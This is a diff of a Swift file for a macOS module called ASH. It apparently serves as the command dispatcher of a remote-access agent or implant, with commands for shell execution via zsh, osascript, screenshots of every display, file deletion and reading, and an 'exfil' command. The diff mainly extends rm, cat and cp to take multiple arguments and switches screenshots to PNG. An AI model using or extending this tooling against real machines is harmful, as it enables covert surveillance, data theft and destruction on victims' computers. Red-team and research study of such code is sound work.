@@ -1,31 +1,32 @@
 import Foundation
 import AppKit
-extension Collection where Indices.Iterator.Element == Index {
-  public subscript(safe index: Index) -> Element? {
-    startIndex..<endIndex ~= index ? self[index]: nil
-  }
-}
 
-struct returnData {
-  var inCommand: String
-  var returnType: String
-  var returnData: Any
-  var returnDict: [String: Any] {
-    return ["inCommand":inCommand, "returnType":returnType, "returnData":returnData]
-  }
-}
-struct returnDataRaw {
-  var inCommand: String
-  var returnType: String
-  var fileName: String
-  var returnData: Any
-  var returnDict: [String: Any] {
-    return ["inCommand":inCommand, "returnType":returnType, "fileName":fileName, "returnData":returnData]
-  }
-}
+//extension Collection where Indices.Iterator.Element == Index {
+//  public subscript(safe index: Index) -> Element? {
+//    startIndex..<endIndex ~= index ? self[index]: nil
+//  }
+//}
+//
+//struct returnData {
+//  var inCommand: String
+//  var returnType: String
+//  var returnData: Any
+//  var returnDict: [String: Any] {
+//    return ["inCommand":inCommand, "returnType":returnType, "returnData":returnData]
+//  }
+//}
+//struct returnDataRaw {
+//  var inCommand: String
+//  var returnType: String
+//  var fileName: String
+//  var returnData: Any
+//  var returnDict: [String: Any] {
+//    return ["inCommand":inCommand, "returnType":returnType, "fileName":fileName, "returnData":returnData]
+//  }
+//}
 
 enum Cmd: String, Equatable {
-  case ls, cd, /* cdr, */ mkdir, whoami, rm, rmdir, ps, cat, mv, strings, cp, screenshot, osascript, exfil, execute, man, shell
+  case ls, cd, mkdir, whoami, rm, rmdir, ps, cat, mv, /* strings, */ cp, screenshot, osascript, exfil, execute, man, shell
 }
 
 struct Command: Equatable {
@@ -42,6 +43,7 @@ struct Command: Equatable {
     guard !cmd.isEmpty else { return nil }
     let split = cmd.split(separator: ";").lazy.map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
     command = Cmd(rawValue: split.first!) ?? .shell
+    // TODO: - Add a proper escaping secuence for arguments with special characters.
     arguments = Array(split.dropFirst())
     filePath = arguments.first ?? ""
   }
@@ -100,11 +102,12 @@ public class ASH {
     }
   }
   
-  private func rmCommand(_ targetPath: String) -> CmdResult {
-    // TODO: - Need to fix to handle multiple arguments to rm
+  private func rmCommand(_ targetPaths: [String]) -> CmdResult {
     do {
-      try ASH.fileManager.removeItem(at: URL(fileURLWithPath: targetPath))
-      return .success(.string(targetPath))
+      for targetPath in targetPaths {
+        try ASH.fileManager.removeItem(at: URL(fileURLWithPath: targetPath))
+      }
+      return .success(.string(targetPaths.joined(separator: " ")))
     }
     catch {
       return .failure(error)
@@ -116,11 +119,17 @@ public class ASH {
     return .success(.string(commandResult))
   }
   
-  private func catCommand(_ targetFile: String) -> CmdResult {
-    // TODO: - Need to fix to handle multiple arguments to cat
+  private func catCommand(_ targetFiles: [String]) -> CmdResult {
+    let targets = targetFiles.map { URL(fileURLWithPath: $0) }
+    guard targets.allSatisfy({ url in ASH.fileManager.isReadableFile(atPath: url.path) })
+    else { return .failure(CmdError.invalidArgument("Some files are not readable")) }
+    
     do {
-      let fileResults = try String(contentsOf: URL(fileURLWithPath: targetFile), encoding: .utf8)
-      return .success(.string(fileResults))
+      let contents = try targets.lazy.map { url in
+        try String(contentsOf: url, encoding: .utf8)
+      }.joined(separator: "\n")
+//      let fileResults = try String(contentsOf: URL(fileURLWithPath: targetFile), encoding: .utf8)
+      return .success(.string(contents))
     }
     catch {
       return .failure(error)
@@ -128,7 +137,6 @@ public class ASH {
   }
   
   private func mvCommand(from srcPaths: [String], to destPath: String) -> CmdResult {
-    // TODO: - Need to fix to handle multiple arguments to mv
     let origUrls = srcPaths.map { URL(fileURLWithPath: $0) }
     var destURL = URL(fileURLWithPath: destPath)
     
@@ -138,7 +146,7 @@ public class ASH {
         && ASH.fileManager.isDeletableFile(atPath: url.path)
     }) else { return .failure(CmdError.invalidArgument("Some files are not moveable")) }
     
-    // If one item to move, just try to move it and report wha the system says
+    // If one item to move, just try to move it and report what the system says
     // If multiple items to move, ensure last arg exists and is a directory then try, else fail
     
     var isDirectory: ObjCBool = false
@@ -167,29 +175,55 @@ public class ASH {
     }
   }
   
-  private func stringsCmd(_ filePath: String) -> CmdResult {
-    let file = URL(fileURLWithPath: filePath)
-    do {
-      let fileResults = try String(contentsOf: file, encoding: .ascii)
-      return .success(.string(fileResults))
-    }
-    catch {
-      return .failure(error)
-    }
-  }
+//  private func stringsCmd(_ filePath: String) -> CmdResult {
+//    // TODO: - Actually make this work
+//    let file = URL(fileURLWithPath: filePath)
+//    do {
+//      let fileResults = try String(contentsOf: file, encoding: .ascii)
+//      return .success(.string(fileResults))
+//    }
+//    catch {
+//      return .failure(error)
+//    }
+//  }
   
-  private func cpCommand(from srcPath: String, to dstPath: String) -> CmdResult {
-    // TODO: - Need to fix to handle multiple arguments to cp
-    let origUrl = URL(fileURLWithPath: srcPath)
-    let destURL = URL(fileURLWithPath: dstPath)
+  private func cpCommand(from srcPaths: [String], to destPath: String) -> CmdResult {
+    let origUrls = srcPaths.map { URL(fileURLWithPath: $0) }
+    var destURL = URL(fileURLWithPath: destPath)
+    
+    //Move a file.  This will delete the previous file
+    guard origUrls.allSatisfy({ url in
+      ASH.fileManager.isReadableFile(atPath: url.path)
+    }) else { return .failure(CmdError.invalidArgument("Some files are not readible")) }
+    
+    // If one item to copy, just try to copy it and report what the system says
+    // If multiple items to copy, ensure last arg exists and is a directory then try, else fail
+    
+    var isDirectory: ObjCBool = false
+    let destExists = ASH.fileManager.fileExists(atPath: destURL.path, isDirectory: &isDirectory)
+    if srcPaths.count == 1 {
+      do {
+        let src = origUrls.first!
+        if destExists && isDirectory.boolValue { destURL.appendPathComponent(src.lastPathComponent) }
+        try ASH.fileManager.copyItem(at: src, to: destURL)
+        return .success(.string("\(origUrls.first!.path) >> \(destURL.path)"))
+      }
+      catch {
+        return .failure(error)
+      }
+    } else {
+      guard destExists && isDirectory.boolValue else { return .failure(CmdError.invalidArgument("Copying multiple sources requires destination to be an existing directory")) }
+      do {
+        try origUrls.forEach { url in
+          let filename = url.lastPathComponent
+          try ASH.fileManager.copyItem(at: url, to: destURL.appendingPathComponent(filename))
+        }
+        return .success(.string("\(origUrls.map(\.path)) >> \(destURL.path)"))
+      } catch {
+        return .failure(error)
+      }
+    }
 
-    do {
-      try ASH.fileManager.copyItem(at: origUrl, to: destURL)
-      return .success(.string("\(origUrl.path) > \(destURL.path)"))
-    }
-    catch {
-      return .failure(error)
-    }
   }
   
   private func screenshotCommand() -> CmdResult {
@@ -200,13 +234,16 @@ public class ASH {
     guard displayList == CGError.success,
           CGGetActiveDisplayList(displayCount, &activeDisplay, &displayCount) == CGError.success
     else { return .failure(CmdError.displyList(displayList)) }
+    
+    print("screenshots - capacity:", capacity, "displayCount:", displayCount)
+    
       //Places all the displays into an object
     let screenshotTime = "\(Date().timeIntervalSince1970)"
     let screenshots: [Data] = (0..<Int(displayCount)).compactMap { displayIdx in
       guard let screenshot: CGImage = CGDisplayCreateImage(activeDisplay[displayIdx]),
-            let jpg = NSBitmapImageRep(cgImage: screenshot).representation(using: .jpeg, properties: [:])
+            let png = NSBitmapImageRep(cgImage: screenshot).representation(using: .png, properties: [:])
       else { return nil }
-      return jpg
+      return png
     }
     return .success(.screenshots(timestamp: screenshotTime, screenshots: screenshots))
   }
@@ -245,7 +282,7 @@ public class ASH {
     let output = Pipe()
     shell.launchPath = "/bin/zsh"
     shell.standardOutput = output
-    shell.arguments = ["-c"] + command
+    shell.arguments = ["-c"] + command    
     shell.launch()
     shell.waitUntilExit()
     let data = output.fileHandleForReading.readDataToEndOfFile()
@@ -266,12 +303,12 @@ public class ASH {
 //    case .cdr: return cdCommand(cmd.fullPath)         //Go to the relative folder in this directory
     case .mkdir: return mkdirCommand(cmd.fullPath)
     case .whoami: return .success(.string(NSUserName())) //Do Get username
-    case .rm: return rmCommand(cmd.fullPath)
+    case .rm: return rmCommand(cmd.arguments)
     case .rmdir:
       var isDir: ObjCBool = false
       let exists = FileManager.default.fileExists(atPath: cmd.fullPath, isDirectory: &isDir)
       switch (exists, isDir.boolValue) {
-      case (true, true): return rmCommand(cmd.fullPath)
+      case (true, true): return rmCommand([cmd.fullPath])
       case (true, false): return .failure(CmdError.invalidArgument("\(cmd.fullPath) is not a directory"))
       case (false, _): return .failure(CmdError.invalidArgument("Directory \(cmd.fullPath) does not exist"))
       }
@@ -279,17 +316,18 @@ public class ASH {
     // Will list all running applications
     // Note that this is not the same as all "processes". E.g. if vim is running in a Terminal,
     // then Terminal will show up in the list, but vim will not.
-    case .cat: return catCommand(cmd.fullPath)
+    case .cat: return catCommand(cmd.arguments)
     case .mv:
       guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("mv requires source and destination arguments")) }
       return mvCommand(from: cmd.arguments.dropLast(), to: cmd.arguments.last!)
-    case .strings:
-      // TODO: - Rewrite this to actually replicate strings functionality
-      return stringsCmd(cmd.fullPath)
+//    case .strings:
+//      // TODO: - Rewrite this to actually replicate strings functionality
+//      // The current version of strings has been replaced by cat
+//      return stringsCmd(cmd.fullPath)
     case .cp:
       //Copy a file
       guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("cp requires source and destination arguments")) }
-      return cpCommand(from: cmd.arguments[0], to: cmd.arguments[1])
+      return cpCommand(from: cmd.arguments.dropLast(), to: cmd.arguments.last!)
     case .screenshot:
       //Gets overall displays
       //Some bugs exist with this command
@@ -326,7 +364,7 @@ public class ASH {
                     """
       return .success(.string(commandResult))
     case .shell:
-      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("no shell command supplied")) }
+      guard !cmd.arguments.isEmpty else { return .failure(CmdError.notEnoughArguments("no shell command supplied")) }
       return shellCommand(cmd.arguments)
     }
   }
